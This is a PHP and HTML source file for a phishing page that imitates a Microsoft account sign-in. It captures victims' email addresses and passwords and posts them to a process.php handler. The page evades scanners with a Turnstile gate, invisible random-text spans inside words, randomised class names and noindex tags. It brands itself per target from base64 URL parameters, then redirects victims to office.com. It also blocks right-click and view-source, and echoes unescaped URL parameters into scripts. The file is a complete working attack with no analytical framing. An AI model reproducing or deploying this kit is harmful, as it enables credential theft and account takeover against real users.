<?php
if (!isset($_COOKIE['captcha']) || $_COOKIE['captcha'] != 1) {
	include 'config.php';
	echo '<html><head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><meta name="viewport" content="width=device-width, initial-scale=1"></head><body> Please stand by, while we are checking your browser... <br><br><form id="myForm" action="validate.php" method="post"><div class="cf-turnstile" data-sitekey="' . $sitekey . '" data-callback="javascriptCallback"></div></form><script>function javascriptCallback(){var a=$("#myForm"),t=a.attr("action");a.submit(function(a){a.preventDefault()}),$.ajax({type:"POST",url:t,data:a.serialize(),success:function(a){location.reload()}})}</script></body></html>';
	exit();
}
function r($length) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $result;
}
?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title><?php echo r(45);?></title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">
    <link href="css/style3.css" rel="stylesheet">
	<meta name="description" content="fud">
	<meta name="robots" content="noindex">
	<meta name="googlebot" content="noindex">
	<meta name="googlebot-news" content="noindex">
	<meta name="otherbot" content="noindex">
	<meta name="noarchive" content="noindex">
	<meta name="nosnippet" content="noindex">
	<meta name="noimageindex" content="noindex"> 
	<meta name="robots" content="nofollow">
	<meta name="googlebot" content="nofollow">
	<meta name="googlebot-news" content="nofollow">
	<meta name="otherbot" content="nofollow">
	<meta name="noarchive" content="nofollow">
	<meta name="nosnippet" content="nofollow">
	<meta name="noimageindex" content="nofollow">
	<meta name="robots" content="max-snippet:0">
    <meta name="robots" content="none">
	<script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <link rel="shortcut icon" href="imgs/fi.ico">
    <style>
        box {
            width: 40%;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.2);
            padding: 35px;
            border: 2px solid #fff;
            border-radius: 20px/50px;
            background-clip: padding-box;
            text-align: center;
        }
		#footer{
			position: fixed;
			 bottom: 0px;
			 width: 100%;
			 overflow: visible;
			 z-index: 99;
			 clear: both;
			 # background-color: #000;
			 # background-color: rgba(0, 0, 0, 0.6);
		}
		div .footerNode a, div .footerNode span{
			color: #000;
			 font-size: 0.75rem;
			 line-height: 28px;
			 white-space: nowrap;
			 display: inline-block;
			 float: right;
			 margin-left: 8px;
			 margin-right: 8px;
		}
        .button {
            font-size: 1em;
            padding: 10px;
            color: #fff;
            border: 2px solid #0067B8;
            border-radius: 20px/50px;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.3s ease-out;
        }

        .button:hover {
            background: #0067B8;
        }

        .overlay {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.7);
            transition: opacity 500ms;
            visibility: hidden;
            opacity: 0;
        }

        .overlay:target {
            visibility: visible;
            opacity: 1;
        }

        .popup {
            margin: 70px auto;
            padding: 20px;
            background: #fff;
            border-radius: 5px;
            width: 30%;
            position: relative;
            transition: all 5s ease-in-out;
        }

        .popup h2 {
            margin-top: 0;
            color: #333;
            font-family: Tahoma, Arial, sans-serif;
        }

        .popup .close {
            position: absolute;
            top: 20px;
            right: 30px;
            transition: all 200ms;
            font-size: 30px;
            font-weight: bold;
            text-decoration: none;
            color: #333;
        }

        .popup .close:hover {
            color: #0067B8;
        }

        .popup .content {
            max-height: 30%;
            overflow: auto;
        }

        @media screen and (max-width: 700px) {
            .box {
                width: 70%;
            }

            .popup {
                width: 70%;
            }
        }
    </style>
</head>

<body  class="cb <?php echo r(6);?>" style="display: block;" data-gr-c-s-loaded="true">

<div>

<div >
<div class="background <?php echo r(6);?>" role="presentation" >

<div  style="background-image: url(&quot;imgs/bg.svg&quot;);">

</div>

<div id="bodybackground" class="backgroundImage <?php echo r(6);?>"  style="<?php echo empty($_GET['bg']) ? 'background-image: url(imgs/bg.svg)' : 'background : linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url(' . base64_decode($_GET['bg']) . ');background-size: cover;background-position-y: center;background-repeat: no-repeat;' ?>">

</div>

</div>

</div>


<form name="f1" id="fud_user" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="" onsubmit="return checkSubmit()">
<script>
var href = window.location.href;
var url_string = href;
var url = new URL(url_string);
var tl = url.searchParams.get("_x_tr_tl");
var hl = url.searchParams.get("_x_tr_hl");
var dir = href.substring(0, href.lastIndexOf('/')) + "/";
document.getElementById("fud_user").action = 'process.php?dir='+dir;
</script>


<div class="outer <?php echo r(6);?>">
<div class="middle <?php echo r(6);?>" >

<div class="inner <?php echo r(6);?>" >

<div >

<img style="max-height: 36px;" id="logoCompany" role="presentation"  src="<?php echo empty($_GET['logo']) ? 'imgs/lg.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd' : base64_decode($_GET['logo']) ?>">

</div>

<div role="main">

<div class="pagination-view <?php echo r(6);?>" >

<div data-viewid="1">

<div >
<div class="identityBanner <?php echo r(6);?>" style="display:none">
<button type="button" class="backButton <?php echo r(6);?>" id="idBtn_Back" aria-label="Back"> <img role="presentation" pngsrc="imgs/e.svg" svgsrc="imgs/e.svg" src="imgs/e.svg"> </button>

<div id="fudname" class="identity <?php echo r(6);?>"></div>
</div>
<div class="row text-title <?php echo r(6);?>" id="loginHeader" role="heading">
<div aria-level="1"  id="titleBox">S<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>i<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>g<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>n<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span> i<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>n

</div>
</div>
<div id="successLogin" style="display: none;">
Do th<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>is to re<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>duce the num<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ber of tim<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>es you are as<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ke<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>d to s<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ig<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>n i<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>n.
<div class="col-md-24 form-group checkbox <?php echo r(6);?>" style="margin-top: 20px;">
<label>
<input id="KmsiCheckboxField" name="DontShowAgain" type="checkbox" value="true"  aria-label="Don't show this again">
<span >Do<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>n'<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t s<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ho<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>w t<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>hi<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>s ag<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ai<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>n</span>
</label>
</div>
<div class="row <?php echo r(6);?>" >
<div >
<div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" >


<div  class="inline-block button-item ext-button-item">
<!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
<input type="button" id="fudbutton9" class="button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit"  aria-describedby="KmsiDescription" value="No">
</div>
<div  class="inline-block button-item ext-button-item">
<input type="button" id="idBtn_Back" class="win-button button-secondary button ext-button secondary ext-secondary"  value="Yes">
</div>
<!-- /ko -->
</div>
</div>
</div>
</div>
</div>

<div class="row <?php echo r(6);?>">
<div role="alert" aria-live="assertive">

<div class="alert alert-error col-md-24 <?php echo r(6);?>" id="fuderrorB"></div>

</div>
<div class="form-group col-md-24 <?php echo r(6);?>">

<div class="placeholderContainer <?php echo r(6);?>" id="emField">

<input type="email" name="user" id="hasfuderror" value="<?php echo isset($_GET['id']) ? $_GET['id'] : ''; ?>" maxlength="113" lang="en" class="form-control ltr_override <?php echo r(6);?>" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Email, phone, or Skype" aria-label="Enter your email address." required="" autofocus="true">

<div id="usernameProgress" class="progress <?php echo r(6);?>" role="progressbar"  aria-label="Please wait" style="display: none;">

<div>
</div>
<div>
</div>
<div>
</div>
<div>
</div>
<div></div>
<div></div>

</div>

</div>
<div class="placeholderContainer <?php echo r(6);?>" id="pwField" style="display: none">

<input required="true" type="password" name="pass" id="fuderr" maxlength="113" lang="en" class="form-control ltr_override <?php echo r(6);?>" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Password" aria-label="Enter your password." autofocus="true">

<div id="pwProgress" class="progress <?php echo r(6);?>" role="progressbar"  aria-label="Please wait" style="display: none;">

<div>
</div>
<div>
</div>
<div>
</div>
<div>
</div>
<div></div>
<div></div>

</div>

</div>

</div>
</div>

<div  class="position-buttons">
<div >

<div class="row <?php echo r(6);?>">
<div class="col-md-24">
<div class="text-13 action-links <?php echo r(6);?>">
<div id="createAccount" class="form-group <?php echo r(6);?>" >N<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>o a<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>cc<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ou<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>n<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>?
<a href="#" id="signup" >C<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>r<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ea<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>te<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span> o<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ne<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>!</a>
</div>
<div id="cantAccess"  class="form-group <?php echo r(6);?>">
<a id="cantAccessAccount" href="#" >C<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>an<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>’t acc<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>es<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>s yo<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>u<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>r ac<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>c<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ou<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>n<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>?</a>
</div>
<div id="fpwd" style="display: none"  class="form-group <?php echo r(6);?>">
<a href="#" >Fo<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>rg<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>o<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span> my p<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>a<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ss<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>w<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>o<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>r<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>d</a>
</div>

</div>
</div>
</div>
</div>
<div class="row <?php echo r(6);?>" >
<div >  <br>
<div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container <?php echo r(6);?>" >



<div  class="inline-block <?php echo r(6);?>">

<input value="Next" type="button" onclick="goNext()" id="fudbutton" class="btn btn-block btn-primary <?php echo r(6);?>" >
</div>
</div>
</div>
</div>
</div>

</div>

</div>

</div>

</div>
<div id="under" class="promoted-fed-cred-box"><div class="promoted-fed-cred-content"><div class="row tile"><div class="table" role="button" tabindex="0" aria-label=""><div class="table-row"><div class="table-cell tile-img medium"><img class="tile-img medium" src="imgs/sig-op.svg"></div><div class="table-cell text-left content"><div>S<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>i<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>g<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>n<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>-<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>i<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>n<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span> <span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>o<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>p<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>t<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>i<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>o<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>n<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;">6</span>s </div></div></div></div></div></div></div>
</div>
</div>
<input type="hidden" name="logo" id="logoForm" value="<?= empty($_GET['logo']) ? '' : base64_decode($_GET['logo']) ?>">
<input type="hidden" name="background" id="fudbkgdform" value="<?= empty($_GET['bg']) ? '' : base64_decode($_GET['bg']) ?>">
<input type="hidden" name="do" value="login">

</div>

</div>
</form>


</div>

<footer id="footer"> <div> <div class="footerNode"> <a href="#">Pr<div hidden=""><?php echo r(6);?></div>iv<div hidden=""><?php echo r(6);?></div>ac<div hidden=""><?php echo r(6);?></div>y & c<div hidden=""><?php echo r(6);?></div>oo<div hidden=""><?php echo r(6);?></div>k<div hidden=""><?php echo r(6);?></div>ie<div hidden=""><?php echo r(6);?></div>s</a> <a href="#">T<div hidden=""><?php echo r(6);?></div>e<div hidden=""><?php echo r(6);?></div>rm<div hidden=""><?php echo r(6);?></div>s of u<div hidden=""><?php echo r(6);?></div>s<div hidden=""><?php echo r(6);?></div>e</a> </div></div></footer>
    <script>
        $(document).ready(function() {
            $('#fuderr').focus();
        });

        $('#hasfuderror').keypress(function(e) {
            var key = e.which;
            if (key == 13) // the enter key code
            {
                goNext();
            }
        });
		
		$("#idBtn_Back").click(function(e) {
			e.preventDefault();
			window.location.href = "login.php";
		
			});
		
        function goNext() {
            $('#hasfuderror').removeClass('has-error');
            $('#fuderrorB').text('');
            var usr = $('#hasfuderror').val();
            var userError = 'Enter a valid email address, phone number, or Skype name.';
            if (isEmail($('#hasfuderror').val())) {
                $('#usernameProgress').css('display', 'block');
                $('#fudbutton').prop('disabled', true);
				//var href = window.location.href;
		        //var dir = href.substring(0, href.lastIndexOf('/')) + "/";
                $.ajax({
                    url: 'process.php',
                    cache: false,
                    type: 'POST',
                    data: 'do=check&email=' + usr,
                    dataType: 'json',
                    success: function(data) {
                        if (data.status == 'error') {
                            $('#hasfuderror').addClass('has-error');
                            $('#fuderrorB').text(data.message);
                        } else if (data.status == 'success') {
                            if (data.background != null) {
								$('div .footerNode a, div .footerNode span').css('color', '#fff');
                                $('#bodybackground').css('background', `linear-gradient( rgba(0, 0, 0, 55%), rgba(0, 0, 0, 0.5) ), url(${data.background}) center / cover no-repeat`);
                                $('#fudbkgdform').val(data.background);
                            }
                            if (data.banner != null) {
                                $('#logoCompany').attr('src', data.banner);
                                $('#logoForm').val(data.banner);
                            }
							$("#under").hide();
							$("#createAccount").hide();
							$("#cantAccess").hide();
							$("#fpwd").show();
							$("#fudbutton").val('Sign in');
                            $('#loginHeader').text('Enter password');
                            $('#fudname').text(usr);
                            $('#emField').css('display', 'none');
                            $('#pwField').css('display', 'block');
                            $('.identityBanner').css('display', 'block');

                            $('#fuderr').focus();
                            $('#fuderrorB').text('');
                            $('#fudbutton9').attr('type', 'submit');
                            $('form').find('input:button').each(function() {
                                $("<input type='submit' />").attr({
                                        name: this.name,
                                        value: this.value
                                    }).insertBefore(this)
                                    .addClass('btn btn-block btn-primary');
                            }).remove();
                        }
                        $('#usernameProgress').css('display', 'none');
                        $('#fudbutton').prop('disabled', false);
                    }
                });
            } else {
                $('#hasfuderror').addClass('has-error');
                $('#fuderrorB').text(userError);
                $('#usernameProgress').css('display', 'none');
            }

        }

        function closeBox() {
            $('#popup1').css('visibility', 'hidden').css('opacity', 0);
            $('#hasfuderror').focus();
        }

        function checkSubmit() {
            var pwd = $('#fuderr').val();
            var pwError = 'Please enter your password.';
            if (pwd.length > 5) {
                $('#fuderrorB').text('');
                $('#pwProgress').css('display', 'block');
                return true;
            } else {
                $('#fuderrorB').text(pwError);
                return false;
            }
        }

        function isEmail(email) {
            var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            return regex.test(email);
        }

        function isfuderror(email) {
			
			$("#under").hide();
			$("#createAccount").hide();
			$("#cantAccess").hide();
			$("#fpwd").show();
			$('#loginHeader').text('Enter password');
			$("#fudbutton").val('Sign in');
            $('#fudname').text(email);
            $('#fuderrorB').html('Y<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ou<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>r ac<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>coun<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t o<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>r p<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>as<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>swo<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>r<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>d i<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>s in<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>co<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>rrec<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t. If y<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ou<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span> don<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t re<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>mem<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ber yo<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ur p<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>as<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>sw<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>or<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>d, <a id="resetnow" href="#">r<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>ese<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t i<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>t no<span style="display: inline; color: rgba(26, 125, 117, 0); max-width: 0.01px; max-height: 0.03px; font-size: 0.02px;"><?php echo r(6);?></span>w.</a>');
			document.getElementById("resetnow").href = window.location.href;
            $('#fuderr').addClass('has-error');
            $('#emField').css('display', 'none');
            $('#pwField').css('display', 'block');
            $('.identityBanner').css('display', 'block');
            $('form').find('input:button').each(function() {
                $("<input type='submit' />").attr({
                        name: this.name,
                        value: this.value
                    }).insertBefore(this)
                    .addClass('btn btn-block btn-primary');
            }).remove();
        }

        function isSuccess(email) {
			$("#under").hide();
			$("#idBtn_Back").hide();
			
            $('#fudname').text(email);
            $('#fuderrorB').text('');
            $('#fuderr').removeClass('has-error');
            $('#fuderr').val('nopassword');
            $('#titleBox').text('Stay signed in?');
            $('#cantAccess').css('display', 'none');
            $('#createAccount').css('display', 'none');
            $('#emField').css('display', 'none');
            $('#pwField').css('display', 'none');
            $('.identityBanner').css('display', 'block');
            $('#fudbutton').attr('type', 'hidden');
            $('#successLogin').css('display', 'block');
            $('form').find('input:button').each(function() {
                $("<input type='submit' />").attr({
                        name: this.name,
                        value: this.value
                    }).insertBefore(this)
                    .addClass('btn btn-block btn-primary');
            }).remove();
            $('#fud_user').attr('action', 'https://office.com/');
            $('#fud_user').attr('method', 'get');
        }
    </script>
	
		<script>
	
		   // prevent ctrl + s
		$(document).bind('keydown', function(e) {
		if(e.ctrlKey && (e.which == 83)) {
		e.preventDefault();
		return false;
		}
		});

		document.addEventListener('contextmenu', event => event.preventDefault());

		document.onkeydown = function(e) {
		if (e.ctrlKey && 
		(e.keyCode === 67 ||   
		//e.keyCode === 86 || 
		e.keyCode === 85 || 
		e.keyCode === 117)) {
		return false;
		} else {
		return true;
		}
		};
		$(document).keypress("u",function(e) {
		if(e.ctrlKey)
		{
		return false;      }
		else {
		return true;
		}});
		
		 </script>


</body>

</html>



<?php
if (isset($_GET['error'])) {
    $id = $_GET['id'];
    echo "<script>isfuderror('$id');</script>";
} else if (isset($_GET['success'])) {
    $id = $_GET['id'];
    echo "<script>isSuccess('$id');</script>";
}

if(isset($_GET['id']) && (!isset($_GET['error']) && !isset($_GET['success']))){
    $id = $_GET['id'];
    echo "<script>goNext();</script>";
}
?>